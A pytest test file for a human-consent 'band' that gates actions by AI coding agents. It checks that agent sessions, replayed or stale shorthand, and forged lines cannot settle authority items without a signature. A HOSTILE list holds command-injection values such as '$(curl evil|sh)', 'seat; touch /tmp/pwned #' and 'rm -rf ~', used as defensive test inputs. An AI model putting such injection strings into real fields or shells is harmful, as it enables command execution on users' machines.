"""Q17-ALL S3: the band's authority sources, the coordinator's rec (D11) and SIG-ONLY shorthand (D8).

Real stores: a thread under a structured envelope (the budget tests' own), a real consent queue with a signed authority
log, a real question store. Synthetic words."""
from __future__ import annotations

import argparse
import shlex
import sqlite3
from datetime import timedelta

import pytest

from levain import band_view
from levain import band_sources
from levain.band_sources import Extra, NO_REC, consent_rule_command, read_extras, rec_letter_of, sheet_text
from levain.consent import ConsentQueue
from levain.consent import band as consent_band
from levain.consent import sign
from levain.consent.questions import Link, QuestionStore
from levain.contracts.namespaces import REVIEW_CLEAR_NAMESPACE
from levain.coordinator import morning, review
from levain.coordinator.store import CoordError
from tests._h4 import h4_home
from tests.test_consent_queue import Log, keys  # noqa: F401 - fixtures
from tests.test_coordinator_budget import Night
from tests.test_coordinator_envelope import ctx, repo, snapshot  # noqa: F401 - fixtures

HOLD = timedelta(hours=3)
OPTS = [("a", "rename it"), ("b", "keep it")]
PLAIN_TERMINAL = [(1111, ["-zsh"]), (1000, ["/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal"])]


@pytest.fixture(autouse=True)
def human_terminal(monkeypatch):
    for name in ("CLAUDE_CODE_SESSION_ID", "CODEX_THREAD_ID", "CLAUDECODE", "CODEX_SANDBOX", "LEVAIN_TURN"):
        monkeypatch.delenv(name, raising=False)
    monkeypatch.setattr(consent_band, "_ancestors", lambda: iter(PLAIN_TERMINAL))


@pytest.fixture
def night(ctx):  # noqa: F811
    return Night(ctx)


@pytest.fixture
def qdir(night):
    return night.store.directory


@pytest.fixture
def cq(night, keys, tmp_path, qdir):  # noqa: F811
    (tmp_path / "auth").mkdir()
    lg = Log(tmp_path / "auth", keys)
    lg.enrol("laptop", "laptop-presence")
    return ConsentQueue(qdir, authority=lg.source, home=h4_home())


@pytest.fixture
def qs(night, qdir):
    return QuestionStore(qdir, clock=night.store._clock)


@pytest.fixture
def env(qdir, tmp_path):
    home = tmp_path / "levain-home"
    home.mkdir()
    (home / "consent").symlink_to(qdir)               # queue_dir_for resolves it to the scratch directory
    return {"LEVAIN_HOME": str(home)}


def file_req(cq, night, command="git push origin main"):
    return cq.file(agent="claude_code", agent_session_id="sess-req", tool_name="Bash",
                   tool_input={"command": command}, cwd=night.c.path, hold=HOLD)


def undecided(cq, night, command="git push origin main"):
    req = file_req(cq, night, command)
    assert cq.mark_undecided(req.id).state == "undecided"
    return req


def ask(qs, what="rename helper?", **over):
    kw = dict(agent="claude_code", agent_session_id="sess-1", what=what, options=OPTS, rec="a", blocks="the rename",
              cwd="/tmp/proj")
    kw.update(over)
    return qs.file(**kw)


def prompt(env, text, session="seat-1", **extra_env):
    out, commit = band_view.hook_prompt({"session_id": session, "prompt": text}, {**env, **extra_env})
    commit()
    return out


def number_of(text, needle):
    for line in text.splitlines():
        if needle in line and line[:1].isdigit():
            return int(line.split(".", 1)[0])
    raise AssertionError(f"{needle!r} is not on a numbered line of:\n{text}")


def answers(qs):
    if not qs.path.exists():
        return []
    with sqlite3.connect(qs.path) as c:
        return c.execute("SELECT question_id, value, channel FROM answers").fetchall()


def states(qdir):
    if not (qdir / "queue.db").exists():
        return []
    with sqlite3.connect(qdir / "queue.db") as c:
        return c.execute("SELECT id, state FROM requests ORDER BY id").fetchall()


def sign_files(qdir):
    d = qdir / "sign"
    return sorted(p.name for p in d.iterdir()) if d.exists() else []


def replies(night):
    return night.c.rows("SELECT kind, ref_id FROM replies WHERE kind IN ('sign', 'answer', 'know') ORDER BY rowid")


class Untouched:
    """What an authority outcome would change: answers, requests, sign files, replies. Equal before and after."""

    def __init__(self, qs, qdir, night):
        self.qs, self.qdir, self.night = qs, qdir, night
        self.before = self.snap()
        self.n: dict[str, int] = {}

    def snap(self):
        return (answers(self.qs), states(self.qdir), sign_files(self.qdir), replies(self.night))

    def holds(self):
        return self.snap() == self.before


# --- D11: the coordinator's rec is a required field of the push body ------------------------------------------------
def test_a_push_body_without_a_rec_is_refused_with_a_clear_error(night, cq):
    req = file_req(cq, night)
    for bad in (None, "", "   "):
        with pytest.raises(CoordError, match="must carry the coordinator's rec"):
            review.push_sign(night.store, night.T, req.id, "land it", rec=bad)
    with pytest.raises(CoordError, match="must carry the coordinator's rec"):
        review.push_sign(night.store, night.T, req.id, "land it")
    with pytest.raises(CoordError, match="must carry the coordinator's rec"):
        review.push_answer(night.store, night.T, "q-1", "which?")
    with pytest.raises(CoordError, match="must carry the coordinator's rec"):
        review.push_answer_unless_held(night.store, night.T, "q-1", "which?")
    assert replies(night) == []


def test_the_rec_is_stored_in_the_body_and_read_back(night, cq):
    req = file_req(cq, night)
    review.push_sign(night.store, night.T, req.id, "land it", rec="a: tests green")
    w = review.waiting_on_you(night.store, sign_open=lambda _r: True, answer_open=lambda _r: True)
    (rec,) = w["threads"][night.T]
    assert rec["rec"] == "a: tests green" and rec["ref_store"] == "queue.db"


# --- D12: sources ------------------------------------------------------------------------------------------------
def test_an_undecided_request_is_an_item_with_no_rec_and_a_pending_one_is_not(night, cq, qdir, qs):
    file_req(cq, night, "echo pending")                       # a live hold at the terminal: not the band's
    req = undecided(cq, night)
    text = band_view.render(qs)
    assert "NEEDS YOU · 1 open" in text and "UNDECIDED: Bash" in text and "git push origin main" in text
    assert "rec: none (authority item)" in text and "a) allow   b) deny" in text and "needs your signature" in text
    assert "consent request gap #1" in text
    assert [e.ref for e in read_extras(qdir, qs._clock).items] == [req.id]


def test_a_coordinator_sign_shows_its_rec_and_lists_its_undecided_request_once(night, cq, qdir, qs):
    req = undecided(cq, night)
    review.push_sign(night.store, night.T, req.id, "land thread T3 onto main", rec="a: tests green, envelope names main")
    text = band_view.render(qs)
    assert "NEEDS YOU · 1 open" in text
    assert "SIGN: land thread T3 onto main" in text and "rec: a: tests green, envelope names main" in text
    assert "UNDECIDED:" not in text                           # the request is listed by its SIGN, once
    assert f"thread {night.T}" in text


def test_the_delivery_pass_files_a_raw_gate_request_with_no_coordinator_rec(night, cq, qs):
    from levain.coordinator import deliver

    req = file_req(cq, night, "git push origin main")
    # the worker launch of the thread files under sess-w1: the pass points at it
    req2 = cq.file(agent="claude_code", agent_session_id="sess-w1", tool_name="Bash",
                   tool_input={"command": "git push origin main"}, cwd=night.c.path, hold=HOLD)
    out = deliver.deliver(night.store)
    assert [r for r, _rp, new in out.signs] == [req2.id] and out.errors == []
    assert "rec: none (authority item)" in band_view.render(qs) and req.id not in band_view.render(qs)


def test_an_answer_record_merges_into_its_question_and_is_never_listed_alone(night, qdir, qs):
    q = ask(qs)
    before = band_view.render(qs)
    review.push_answer(night.store, night.T, q.id, "asks which name", rec="a: the short one")
    text = band_view.render(qs)
    assert text.count("rename helper?") == 1 and "NEEDS YOU · 1 open" in text
    assert "escalated by the coordinator: asks which name · rec on record: a: the short one" in text
    assert before.count("\n") + 1 == text.count("\n")        # one line more, no item more


def test_know_receipt_and_review_items_stay_off_the_band(night, qdir, qs):
    review.file_know(night.store, night.T, "the coordinator noticed a thing", by="service")
    assert band_view.render(qs) == ""


def test_a_sign_that_cannot_be_read_is_listed_unreadable_never_dropped(night, qdir, qs):
    review.push_sign(night.store, None, "np-not-in-the-queue", "sign the thing", rec=review.NO_REC)
    text = band_view.render(qs)
    assert "UNREADABLE: SIGN" in text and "listed, never dropped" in text and "NEEDS YOU · 1 open" in text


def test_a_budget_extend_sign_is_an_item_and_closes_when_the_extension_is_accepted(night, qdir, qs):
    night.calls(7)
    night.leg()
    text = band_view.render(qs)
    n = number_of(text, "extend a thread budget")
    assert "a) sign the extension   b) leave it unsigned" in text and "rec: none (authority item)" in text
    body, signed = night.extension("laptop", tool_calls=50)
    night.c.accept(signed)
    after = band_view.render(qs)
    assert f"closed {n}" in after and "extend a thread budget" not in after


def test_an_item_closing_is_shown_once_and_its_number_is_retired(night, cq, qdir, qs):
    req = file_req(cq, night)
    review.push_sign(night.store, night.T, req.id, "land it", rec="a")
    first = band_view.render_full(qs)
    n = first.shown[0]
    assert cq.withdraw(req.id)
    gone = band_view.render_full(qs)
    assert f"closed {n}" in gone.text and gone.closed == [n]
    band_view.mark_closed_shown(qs, gone.closed)
    assert band_view.render(qs) == ""
    req2 = file_req(cq, night, "git push origin dev")
    review.push_sign(night.store, night.T, req2.id, "land it again", rec="a")
    assert band_view.render_full(qs).shown == [n + 1]


def test_numbers_follow_each_sources_filed_time_across_sources(night, cq, qdir):
    from datetime import datetime, timezone

    class Tick:
        now = datetime(2026, 10, 28, 9, 0, tzinfo=timezone.utc)

        def __call__(self):
            self.now += timedelta(seconds=1)
            return self.now

    tick = Tick()
    cq._clock = tick
    qs = QuestionStore(qdir, clock=tick)
    ask(qs, "first question")
    undecided(cq, night)
    ask(qs, "last question")
    text = band_view.render(qs)
    assert [number_of(text, w) for w in ("first question", "UNDECIDED", "last question")] == [1, 2, 3]


# --- D8 SIG-ONLY: shorthand on an authority item opens its ceremony and records nothing ------------------------------
def test_shorthand_on_an_undecided_request_names_the_consent_rule_and_records_nothing(night, cq, qdir, qs, env):
    undecided(cq, night)
    prompt(env, "hello")
    guard = Untouched(qs, qdir, night)
    out = prompt(env, "1a")
    assert "signature needed, nothing recorded" in out and "1a: `levain consent rule 1 allow" in out
    assert "--agent claude_code --session sess-req --signing-key KEY" in out and "recorded: nothing" in out
    assert "deny" in prompt(env, "1b") and guard.holds()


def test_shorthand_on_a_coordinator_sign_with_a_rec_letter_takes_the_rec(night, cq, qdir, qs, env):
    req = undecided(cq, night)
    review.push_sign(night.store, night.T, req.id, "land it", rec="a: green")
    prompt(env, "hello")
    guard = Untouched(qs, qdir, night)
    out = prompt(env, "1: rec")
    assert "1 rec→a: `levain consent rule 1 allow" in out and guard.holds()


def test_rec_on_a_raw_gate_request_has_no_letter_to_preselect(night, cq, qdir, qs, env):
    undecided(cq, night)
    prompt(env, "hello")
    guard = Untouched(qs, qdir, night)
    out = prompt(env, "1 rec")
    assert "no rec letter to preselect" in out and "levain consent rule" not in out and guard.holds()


def test_shorthand_on_a_budget_extend_names_envelope_sign(night, qdir, qs, env, monkeypatch):
    monkeypatch.setattr(band_view, "QuestionStore", lambda d: QuestionStore(d, clock=night.store._clock))
    night.calls(7)
    night.leg()
    prompt(env, "hello")
    guard = Untouched(qs, qdir, night)
    out = prompt(env, "1a")
    assert "levain envelope sign FILE" in out and guard.holds()
    assert "unsigned is the decline" in prompt(env, "1b") and guard.holds()


def test_shorthand_on_a_link_question_names_the_phone_sheet_and_records_nothing(night, qdir, qs, env):
    ask(qs, "push the fix?", link=Link("a", "push", "req-1", "qid-1"))
    prompt(env, "hello")
    guard = Untouched(qs, qdir, night)
    out = prompt(env, "1a")
    assert "open question #1 on your phone" in out and "signs the ruling first" in out and guard.holds()
    assert "only 'rename it' carries" not in out
    assert "only 'rename it' carries the signed ruling" in prompt(env, "1b") and guard.holds()


def test_free_text_and_a_letter_past_the_options_on_an_authority_item_open_nothing(night, cq, qdir, qs, env):
    undecided(cq, night)
    prompt(env, "hello")
    guard = Untouched(qs, qdir, night)
    assert "words are not a pick" in prompt(env, "1: sure go ahead")
    assert "no option c" in prompt(env, "1c")
    assert "conflict" in prompt(env, "1a, 1b") and "levain consent rule" not in prompt(env, "1a, 1b")
    assert guard.holds()


def test_the_sweep_takes_information_items_only_and_skips_authority_items(night, cq, qdir, qs, env):
    q = ask(qs, "plain one")
    undecided(cq, night)
    ask(qs, "linked", link=Link("a", "push", "req-1", "qid-1"))
    prompt(env, "hello")
    out = prompt(env, "all recs")
    assert [(a[0], a[1]) for a in answers(qs)] == [(q.id, "a")]
    assert "the sweep left it alone" in out and "levain consent rule" not in out and "phone" not in out
    assert states(qdir)[0][1] == "undecided"


def test_the_ceremony_of_a_sign_request_names_its_sheet_version_and_choice_in_words(qdir):
    rid = sign.file_levain_request(qdir, REVIEW_CLEAR_NAMESPACE, "levain review clear rv-" + "ab" * 16 + " open none",
                                   title="t", ttl_s=600)
    e = Extra("sign", "r-1", "", "coordinator", "SIGN: x", ("sign (allow)", "deny"), "a", "a", "x", "o", None,
              {"request_id": rid, "gap": None})
    version = sign.read_request(qdir, rid).sha256
    text = sheet_text(e, "a", qdir)
    # no deep link: nothing a band reader can see records the cockpit's origin (S3 fix round 1, item 6)
    assert text.startswith(f"open the cockpit's sign sheet for sign request {rid} (version {version[:16]}")
    assert "://" not in text
    assert sign_files(qdir) == [f"{rid}.json"]                 # opening the sheet signs nothing
    assert "rule request" in sheet_text(Extra(**{**e.__dict__, "data": {"request_id": "np-none", "gap": None}}),
                                        "b", qdir)


def test_rec_letter_is_read_only_from_a_leading_letter_that_names_an_option():
    assert rec_letter_of("a: tests green", 2) == "a" and rec_letter_of("b", 2) == "b"
    assert rec_letter_of("c: nope", 2) is None and rec_letter_of("sign it", 2) is None
    assert rec_letter_of(NO_REC, 2) is None and rec_letter_of(None, 2) is None


# --- adversarial: no path other than the signed one settles an authority item ---------------------------------------
@pytest.fixture
def armed(night, cq, qdir, qs, env):
    """One UNDECIDED request, one coordinator SIGN, one Link question: three authority items, a seat that saw them."""
    req = undecided(cq, night)
    pend = file_req(cq, night, "git push origin dev")
    review.push_sign(night.store, night.T, pend.id, "land dev", rec="a: green")
    ask(qs, "push it?", link=Link("a", "push", "req-1", "qid-1"))
    seen = prompt(env, "hello")
    assert "NEEDS YOU · 3 open" in seen
    guard = Untouched(qs, qdir, night)
    guard.n = {"consent": number_of(seen, "UNDECIDED"), "sign": number_of(seen, "land dev"),
               "link": number_of(seen, "push it?")}
    guard.pending = pend.id
    return guard


def run_cli(qdir, line):
    return consent_band_run(argparse.Namespace(line=line, queue_dir=qdir))


def consent_band_run(ns):
    return band_view.run_band_answer(ns)


@pytest.mark.parametrize("name", ["CLAUDE_CODE_SESSION_ID", "CODEX_THREAD_ID"])
def test_16a_typed_from_an_agent_session_records_nothing_and_opens_nothing(armed, qdir, qs, monkeypatch, capsys, name):
    band_view.run_band(argparse.Namespace(queue_dir=qdir))
    capsys.readouterr()
    monkeypatch.setenv(name, "agent-session-1")
    n = armed.n
    for line in (f"{n['consent']}a", f"{n['sign']}a", f"{n['link']}a", "all recs", f"{n['sign']}: rec"):
        assert run_cli(qdir, line) != 0
    err = capsys.readouterr()
    assert "agent" in err.err and "signature needed" not in err.out + err.err and "levain consent rule" not in err.out
    assert armed.holds()


def test_a_relay_turn_is_never_parsed_so_authority_shorthand_opens_nothing(armed, env):
    n = armed.n
    for text in (f"{n['consent']}a", f"{n['sign']}a, {n['link']}a"):
        out = prompt(env, text, LEVAIN_TURN="relay")
        assert "signature needed" not in out and "levain consent rule" not in out and "phone" not in out
        assert "Levain band answer" not in out
    out = prompt(env, f"levain: an answer was recorded for question #1 (a). {armed.n['consent']}a")
    assert "signature needed" not in out and "Levain band answer" not in out
    assert armed.holds()


def test_a_stale_view_cannot_reach_an_authority_item_filed_after_it(armed, night, cq, qdir, qs, env):
    late = undecided(cq, night, "git push origin late")
    armed.before = armed.snap()                                # the late request is filed; the seat has not seen it
    seen = band_view.render(qs)
    n_late = number_of(seen, "git push origin late")
    assert n_late == 4
    out = prompt(env, f"{n_late}a")                            # above the view's high-water mark
    assert f"{n_late} was filed after the band you saw; nothing recorded for it" in out
    assert "git push origin late" not in out.split("NEEDS YOU")[0] and "signature needed" not in out
    assert armed.holds()
    out = prompt(env, f"{armed.n['consent']}a, 9a")           # beside a real item the stale number still opens nothing
    assert "9 was filed after the band you saw" in out and "levain consent rule" in out.split("refused")[1]
    assert late.id in dict(states(qdir)) and armed.holds()


def test_a_replayed_shorthand_after_the_item_closed_opens_nothing(armed, night, cq, qdir, qs, env):
    sign_n = armed.n["sign"]
    assert cq.withdraw(armed.pending)                          # the SIGN's request closed (settled elsewhere)
    armed.before = armed.snap()
    for _ in range(2):                                         # the replayed line, typed again, is refused the same way
        out = prompt(env, f"{sign_n}a").split("NEEDS YOU")[0]
        assert f"{sign_n} was not open in the band you saw; nothing recorded for it" in out
        assert "levain consent rule" not in out and "signature needed" not in out
    assert armed.holds() and answers(qs) == [] and sign_files(qdir) == []


def test_a_replayed_shorthand_on_a_link_question_answered_since_is_refused(armed, qs, env):
    n = armed.n["link"]
    qs.answer(qs.get(1).id, option="a", channel="phone")      # the Link question, settled elsewhere since the view
    before = answers(qs)
    out = prompt(env, f"{n}a").split("NEEDS YOU")[0]
    assert f"{n} was already answered" in out and "signature needed" not in out and "open question" not in out
    assert answers(qs) == before


def test_no_shorthand_reaches_a_ruling_or_a_sign_file_whatever_the_caller(armed, qdir, qs, env, monkeypatch, capsys):
    n = armed.n
    for line in (f"{n['consent']}a", f"{n['consent']}b", f"{n['sign']}a", f"{n['link']}a", "all recs",
                 f"{n['sign']}: rec, {n['link']}: rec"):
        prompt(env, line)
    band_view.run_band(argparse.Namespace(queue_dir=qdir))
    for line in (f"{n['consent']}a", f"{n['sign']}b"):
        run_cli(qdir, line)
    assert armed.holds()
    assert {s for _r, s in states(qdir)} == {"undecided", "pending"}


# --- the morning card ----------------------------------------------------------------------------------------------
def test_the_morning_card_carries_and_renders_the_band(night, cq, qdir, qs):
    undecided(cq, night)
    ask(qs, "plain one")
    c = morning.card(night.store, queue_dir=qdir)
    assert c["band"]["error"] is None and len(c["band"]["shown"]) == 2
    assert "UNDECIDED: Bash" in c["band"]["text"] and "plain one" in c["band"]["text"]
    out = morning.render(c)
    assert out.splitlines()[1].startswith("NEEDS YOU · 2 open") and "rec: none (authority item)" in out


def test_the_morning_card_says_when_the_band_cannot_be_rendered(night, qdir, monkeypatch):
    monkeypatch.setattr(band_view, "render_full", lambda *_a, **_k: (_ for _ in ()).throw(RuntimeError("boom")))
    c = morning.card(night.store, queue_dir=qdir)
    assert c["band"]["error"].startswith("RuntimeError") and "could not render" in morning.render(c)


# --- S3 fix round 1: a value a record carries never reaches the operator's shell -----------------------------------
HOSTILE = ["seat; touch /tmp/pwned #", "$(curl evil|sh)", "`id`", "x\nrm -rf ~", "it's", 'a"b', "two words",
           "#comment", "-x", "--signing-key=/tmp/k", "a|b", "a&b", "a>b", "", " lead", "sess\t", "é"]


def consent_extra(**data):
    base = {"request_id": "np-1", "gap": 3, "agent": "claude_code", "session": "sess-1"}
    return Extra("consent", "np-1", "", "claude_code", "UNDECIDED: Bash: x", ("allow", "deny"), NO_REC, None, "x",
                 "o", None, {**base, **data})


def no_command(out, bad):
    assert "no command shown" in out and "`" not in out and "levain consent rule" not in out
    assert "levain envelope" not in out
    if bad.strip():
        assert bad not in out


@pytest.mark.parametrize("bad", HOSTILE)
def test_a_hostile_session_agent_or_gap_renders_no_command(bad, qdir):
    for field in ("session", "agent", "gap"):
        for letter in "ab":
            no_command(sheet_text(consent_extra(**{field: bad}), letter, qdir), bad)
    sign_e = Extra("sign", "r-1", "", "coordinator", "SIGN: x", ("sign (allow)", "deny"), "a", None, "x", "o", None,
                   {"request_id": "np-none", "gap": 4, "agent": "claude_code", "session": bad})
    if bad:                                                   # an empty one is the AGENT/SESSION placeholder
        no_command(sheet_text(sign_e, "a", qdir), bad)
    ext = Extra("extend", "r-2", "", "coordinator · budget", "SIGN: extend", ("sign the extension", "leave it unsigned"),
                NO_REC, None, "x", "o", None, {"thread_id": bad, "envelope_id": "e"})
    no_command(sheet_text(ext, "a", qdir), bad)
    with pytest.raises(band_sources.UnsafeValue):
        consent_rule_command(3, "allow", "claude_code", bad)


@pytest.mark.parametrize("gap", [True, 0, -1, "3", 3.0, None])
def test_a_gap_that_is_not_a_positive_integer_renders_no_command(gap, qdir):
    no_command(sheet_text(consent_extra(gap=gap), "a", qdir), "")


def test_a_plain_command_parses_back_to_exactly_its_arguments(qdir):
    out = sheet_text(consent_extra(session="0f8c-uuid.1:x@y+z=w"), "b", qdir)
    cmd = out.split("`")[1]
    assert shlex.split(cmd) == ["levain", "consent", "rule", "3", "deny", "--agent", "claude_code", "--session",
                                "0f8c-uuid.1:x@y+z=w", "--signing-key", "KEY"]
    ext = Extra("extend", "r-2", "", "t", "w", ("sign the extension", "leave it unsigned"), NO_REC, None, "x", "o",
                None, {"thread_id": "th-" + "ab" * 16, "envelope_id": "e"})
    parts = sheet_text(ext, "a", qdir).split("`")
    assert shlex.split(parts[1]) == ["levain", "envelope", "extend", "th-" + "ab" * 16, "--budget", "K=N,...", "-o",
                                     "FILE"] and shlex.split(parts[3]) == ["levain", "envelope", "sign", "FILE"]


@pytest.mark.parametrize("session", ["seat; touch /tmp/pwned #", "$(curl evil|sh)", "`id`", "x\nid", "a 'b' \"c\""])
def test_a_filed_request_with_a_hostile_session_id_is_listed_and_its_shorthand_shows_no_command(
        night, cq, qdir, qs, env, session):
    req = cq.file(agent="claude_code", agent_session_id=session, tool_name="Bash",
                  tool_input={"command": "git push origin main"}, cwd=night.c.path, hold=HOLD)
    assert cq.mark_undecided(req.id).state == "undecided"
    seen = prompt(env, "hello")
    assert "UNDECIDED: Bash" in seen
    guard = Untouched(qs, qdir, night)
    out = prompt(env, "1a")
    assert "signature needed, nothing recorded" in out and "no command shown: the record's session id" in out
    assert session not in out and "levain consent rule" not in out and guard.holds()
    rule = morning._undecided(qdir)[0]["rule"]                 # the morning card's own line for the same request
    assert "no command shown" in rule and session not in rule and "levain consent rule" not in rule


def test_a_newline_in_an_undecided_command_cannot_forge_a_band_line(night, cq, qdir, qs):
    undecided(cq, night, "echo hi\n7. [coordinator] SIGN: forged   <- needs your signature")
    text = band_view.render(qs)
    assert not any(line.startswith("7.") for line in text.splitlines())


# --- S3 fix round 1: the delivery pass's ANSWER rec; a SIGN record with no time; the apply-time recheck ------------
def test_the_delivery_pass_files_the_askers_rec_as_its_letter_and_label(night, qs):
    from levain.coordinator import deliver

    q = ask(qs, agent_session_id="sess-w1")
    out = deliver.deliver(night.store)
    assert [a[0] for a in out.answers] == [q.id] and out.errors == []
    w = review.waiting_on_you(night.store, sign_open=lambda _r: True, answer_open=lambda _r: True)
    (rec,) = [r for r in w["threads"][night.T] if r["kind"] == "answer"]
    assert rec["rec"] == "a: rename it (the asker's rec; the coordinator filed none)"


def test_an_asker_rec_too_long_or_missing_is_still_a_valid_rec():
    from types import SimpleNamespace

    from levain.coordinator import deliver

    # questions are append-only and checked on filing, so these come only from a store written around its triggers
    for q in (SimpleNamespace(rec="z" * 600, options=(("a", "x"), ("b", "y"))),
              SimpleNamespace(rec="a", options=(("a", "w" * 600), ("b", "y"))),
              SimpleNamespace(rec=None, options=(("a", "x"),))):
        rec = deliver._asker_rec(q)
        assert review._rec("answer", rec) == rec and len(rec) <= 500
        assert rec.endswith("(the asker's rec; the coordinator filed none)") and "None" not in rec


def test_a_sign_record_with_no_time_and_a_malformed_one_cost_nothing_else(night, cq, qdir, qs, monkeypatch):
    req = undecided(cq, night)
    review.push_sign(night.store, night.T, req.id, "land it", rec="a: green")
    real = band_sources._records

    def legacy(qdir_, clock=None):
        w, at = real(qdir_, clock)
        bad = {"kind": "sign", "ref_id": "np-x", "reply_id": "rp-bad", "text": "t", "rec": None}   # no ref_store
        w = {**w, "loose": [*w["loose"], bad]}
        return w, {k: None for k in at}                       # a legacy row whose time is NULL
    monkeypatch.setattr(band_sources, "_records", legacy)
    got = read_extras(qdir, qs._clock)
    assert got.failed == [] and {"sign", "extend"} <= got.complete
    assert [e.what for e in got.items if e.unreadable is None] == ["SIGN: land it"]
    assert [e.ref for e in got.items if e.unreadable] == ["rp-bad"]


def test_a_sign_item_closed_between_plan_and_apply_opens_nothing(armed, cq, qs):
    band_view.run_band(argparse.Namespace(queue_dir=qs.directory))
    plan, view, questions, extras = band_view.plan_for_full(qs, "cli", f"{armed.n['sign']}a")
    assert plan.sheets and extras
    assert cq.withdraw(armed.pending)                          # settled elsewhere after the plan was made
    done = band_view.apply_plan(qs, plan, questions, viewer="cli", via="cli", seen_through=view.seen_through,
                                extras=extras)
    assert done.sheets == () and f"{armed.n['sign']} closed since the band you saw; nothing opened" in done.echo


def test_an_undecided_request_ruled_between_plan_and_apply_opens_nothing(armed, qs, monkeypatch):
    band_view.run_band(argparse.Namespace(queue_dir=qs.directory))
    n = armed.n["consent"]
    plan, view, questions, extras = band_view.plan_for_full(qs, "cli", f"{n}a")
    assert plan.sheets and n in extras
    monkeypatch.setattr(band_sources, "_consent", lambda _q: [])   # ruled (signed) elsewhere since the plan
    done = band_view.apply_plan(qs, plan, questions, viewer="cli", via="cli", seen_through=view.seen_through,
                                extras=extras)
    assert done.sheets == () and "levain consent rule" not in done.echo and f"{n} closed since" in done.echo


def test_an_unreadable_source_is_said_never_reported_as_closed(armed, qs, monkeypatch):
    band_view.run_band(argparse.Namespace(queue_dir=qs.directory))
    n = armed.n["consent"]

    def boom(_q):
        raise sqlite3.OperationalError("database is locked")
    monkeypatch.setattr(band_sources, "_consent", boom)
    plan, *_ = band_view.plan_for_full(qs, "cli", f"{n}a")
    assert [r.reason for r in plan.refused] == [f"{n}: its source could not be read just now, so Levain cannot tell "
                                                "it is still open; nothing opened (try again)"]


def test_a_sheet_from_the_cli_exits_zero_and_records_nothing(armed, qdir, capsys):
    band_view.run_band(argparse.Namespace(queue_dir=qdir))
    capsys.readouterr()
    assert run_cli(qdir, f"{armed.n['consent']}a") == 0
    assert "levain consent rule" in capsys.readouterr().out and armed.holds()


def test_an_extra_with_more_options_than_letters_still_renders():
    e = Extra("sign", "r", "", "t", "w", tuple(f"o{i}" for i in range(8)), NO_REC, None, "x", "o")
    assert "f) o5" in band_view._extra_lines("1.", e, compact=False)[1]
